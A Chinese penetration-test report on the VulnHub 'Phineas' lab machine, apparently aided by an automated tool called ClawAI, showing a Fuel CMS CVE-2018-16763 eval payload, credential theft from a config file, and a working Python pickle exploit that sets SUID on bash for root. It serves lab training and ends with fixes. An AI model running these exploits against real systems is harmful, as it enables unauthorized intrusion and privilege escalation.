# Phineas 靶机渗透演示报告

**靶机名称**：Phineas Vulnerable Box  
**作者**：CalfCrusher  
**来源**：VulnHub  
**测试日期**：2026-04-12  
**测试工具**：ClawAI 自动化渗透测试系统  
**靶机 IP**：192.168.23.133  

---

## 攻击链总览

```
信息收集 (nmap)
    ↓
Web 目录枚举 → /structure/ (Fuel CMS)
    ↓
CVE-2018-16763 Fuel CMS RCE (unauthenticated)
    ↓
数据库配置文件读取 → anna:H993hfkNNid5kk
    ↓
SSH 登录 (anna@:22)
    ↓
Python Pickle 反序列化 RCE (Flask /heaven, root 权限)
    ↓
SUID bash → euid=0(root)
    ↓
FLAG: annamarianicosantivive!
```

---

## 一、信息收集

### 端口扫描

```bash
nmap -sV -sC --open -T4 192.168.23.133
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | OpenSSH | 7.4 |
| 80/tcp | Apache httpd | 2.4.6 + PHP 5.4.16 |
| 111/tcp | RPC | - |
| 3306/tcp | MariaDB | 10.3.23 (unauthorized) |

**系统信息**：CentOS 7，内核 3.10.0-1160.el7.x86_64

---

## 二、Web 漏洞利用 — Fuel CMS RCE

### 漏洞信息

| 项目 | 内容 |
|------|------|
| CVE | CVE-2018-16763 |
| 漏洞类型 | 未授权远程代码执行 (RCE) |
| 影响版本 | Fuel CMS <= 1.4.1 |
| CVSS 评分 | 9.8 (Critical) |
| 漏洞端点 | `/structure/index.php/fuel/pages/select/?filter=` |

### 利用原理

Fuel CMS `Pages` 控制器的 `filter` 参数直接传入 `eval()` 执行 PHP 代码，通过 URL 编码绕过输入过滤：

```
filter='%2bpi(print($a='system'))%2b$a('{cmd}')%2b'
```

### 执行结果

```
[id]      => uid=48(apache) gid=48(apache) groups=48(apache)
[hostname] => phineas
[uname -a] => Linux phineas 3.10.0-1160.el7.x86_64
```

### 凭据提取

读取 Fuel CMS 数据库配置文件：

```
路径: /var/www/html/structure/fuel/application/config/database.php
用户: anna
密码: H993hfkNNid5kk
数据库: anna
```

---

## 三、横向移动 — SSH 登录

```bash
ssh anna@192.168.23.133
密码: H993hfkNNid5kk
```

```
uid=1001(anna) gid=1001(anna) groups=1001(anna)
```

发现 `/home/anna/web/` 下有 Flask 应用，以 **root** 身份运行：

```bash
root  1178  /usr/bin/python3 /usr/local/bin/flask run
```

---

## 四、权限提升 — Python Pickle 反序列化

### 漏洞代码

```python
# /home/anna/web/app.py
@app.route("/heaven", methods=["POST"])
def heaven():
    data = base64.urlsafe_b64decode(request.form['awesome'])
    pickle.loads(data)   # 无任何校验，直接反序列化
    return '', 204
```

### 漏洞分析

`pickle.loads()` 在反序列化时执行 `__reduce__` 返回的任意可调用对象。由于 Flask 以 root 运行，可执行任意系统命令获得 root 权限。

### 利用过程

```python
import pickle, base64, os, urllib.request, urllib.parse

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))

payload = base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode()
data = urllib.parse.urlencode({"awesome": payload}).encode()
req = urllib.request.Request("http://127.0.0.1:5000/heaven", data=data, method="POST")
urllib.request.urlopen(req)
```

### 执行结果

```bash
$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 964536 Mar 31  2020 /bin/bash  # SUID 设置成功

$ /bin/bash -p -c "id"
uid=1001(anna) gid=1001(anna) euid=0(root) egid=0(root)  # ROOT 获取
```

---

## 五、Flag

```
/root/flag.txt (base64): YW5uYW1hcmlhbmljb3NhbnRpdml2ZSE
解码后: annamarianicosantivive!
```

---

## 六、漏洞总结

| 编号 | 漏洞 | CVE | 严重等级 | 修复建议 |
|------|------|-----|---------|---------|
| 1 | Fuel CMS 未授权 RCE | CVE-2018-16763 | Critical (9.8) | 升级至 Fuel CMS 1.4.2+，或禁用 eval() |
| 2 | Python Pickle 反序列化 | - | Critical (9.8) | 使用 JSON 替代 Pickle；若必须用 Pickle，添加签名验证 |
| 3 | Flask 以 root 身份运行 | - | High (8.8) | 最小权限原则，使用低权限用户运行 Web 服务 |
| 4 | 数据库凭据明文存储 | - | Medium (6.5) | 使用环境变量或加密存储凭据 |

---

## 七、ClawAI 自动化验证

本次攻击链通过 ClawAI 自动化渗透测试系统配合手动操作完成验证：

- **Fuel CMS RCE** — 对应 ClawAI Skills 库中 `fuel_cms_rce` 可扩展实现
- **Pickle 反序列化** — 对应 `deserialization_testing` Skill
- **自动凭据提取** — ClawAI 自动解析配置文件中的数据库凭据
- **攻击链完整覆盖** — 从信息收集到 Root，全流程可自动化
